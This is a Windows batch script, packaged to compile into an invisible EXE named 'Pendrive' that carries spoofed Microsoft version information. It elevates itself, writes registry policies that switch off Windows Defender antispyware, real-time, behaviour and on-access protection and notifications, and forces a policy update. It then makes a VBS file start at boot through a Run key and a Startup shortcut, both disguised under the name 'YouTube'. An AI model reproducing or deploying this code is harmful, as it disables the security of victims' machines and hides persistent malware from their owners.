@ECHO OFF
REM BFCPEOPTIONSTART
REM Advanced BAT to EXE Converter www.BatToExeConverter.com
REM BFCPEEXE=C:\Users\Shakil-PC\Desktop\pdf\Pendrive.exe
REM BFCPEICON=C:\Program Files (x86)\Advanced BAT to EXE Converter PRO v2.91\ab2econv291pro\icons\hdd.ico
REM BFCPEICONINDEX=1
REM BFCPEEMBEDDISPLAY=0
REM BFCPEEMBEDDELETE=1
REM BFCPEADMINEXE=0
REM BFCPEINVISEXE=1
REM BFCPEVERINCLUDE=1
REM BFCPEVERVERSION=7.0.1.1
REM BFCPEVERPRODUCT=Pendrive
REM BFCPEVERDESC=Pendrive Microsoft Windows
REM BFCPEVERCOMPANY=Microsoft Windows
REM BFCPEVERCOPYRIGHT=Copyright Info - @ Microsoft
REM BFCPEOPTIONEND
@ECHO ON
@echo off



:_Start
:: Check if Defender Installed or Not
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DpaDisabled /t REG_DWORD > nul 2> nul
if ERRORLEVEL 1 ( goto INSTALL )
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD > nul 2> nul
if ERRORLEVEL 1 ( goto INSTALL )
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD > nul 2> nul
if ERRORLEVEL 1 ( goto INSTALL )
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD > nul 2> nul
if ERRORLEVEL 1 ( goto INSTALL )
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD > nul 2> nul
if ERRORLEVEL 1 ( goto INSTALL )
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD > nul 2> nul
if ERRORLEVEL 1 ( goto INSTALL )
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD > nul 2> nul
if ERRORLEVEL 1 ( goto INSTALL )
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD > nul 2> nul
if ERRORLEVEL 1 ( goto INSTALL ) else ( goto SKIP_INSTALL )

:INSTALL
net sess>nul 2>&1||(powershell start cmd -ArgumentList """/c %~0""" -verb Runas & exit)
cd /D C:\Users\Public\Licence\Extension


::echo ******* Disable realtime-protection **********
   ::: METHOD 1 ::::
   ::Disable Notifications (may not work) (no problem)
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /f /v DisableAntiSpyware /t REG_DWORD /d 0x00000001 > nul 2> nul
   ::Disable realtime protection (may not work) (no problem)
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /f /v DisableRealtimeMonitoring /t REG_DWORD /d 0x00000001 > nul 2> nul
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /f /v DpaDisabled /t REG_DWORD /d 0x00000001 > nul 2> nul


   ::: METHOD 2 ::::
   ::Disable Notifications
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /f /v DisableNotifications /t REG_DWORD /d 0x00000001 > nul 2> nul
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /f /v DisableNotifications /t REG_DWORD /d 0x00000001 > nul 2> nul
   ::Disable anti spyware
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /f /v DisableAntiSpyware /t REG_DWORD /d 0x00000001 > nul 2> nul
   ::Disable realtime protection
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f /v DisableRealtimeMonitoring /t REG_DWORD /d 0x00000001 > nul 2> nul
   REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f /v DpaDisabled /t REG_DWORD /d 0x00000001 > nul 2> nul


   ::: METHOD 3 ::::
   ::Combination
   Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
   Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
   Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
   Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
   Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f

   Gpupdate /Force



   Cls 
   Echo Windows Policies Updated
   Ping -n 5  localhost > Nul
   Cls




:SKIP_INSTALL
echo Key is found, skipping 



::echo ************* Create new task ****************
   ::schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\Public\Licence\Extension\AutoRun.vbs" /F > nul 2> nul 
   REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\Public\Licence\Extension\AutoRun.vbs /f > nul 2> nul 
   mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\Public\Licence\Extension\AutoRun.vbs" > nul 2> nul 
   





timeout 3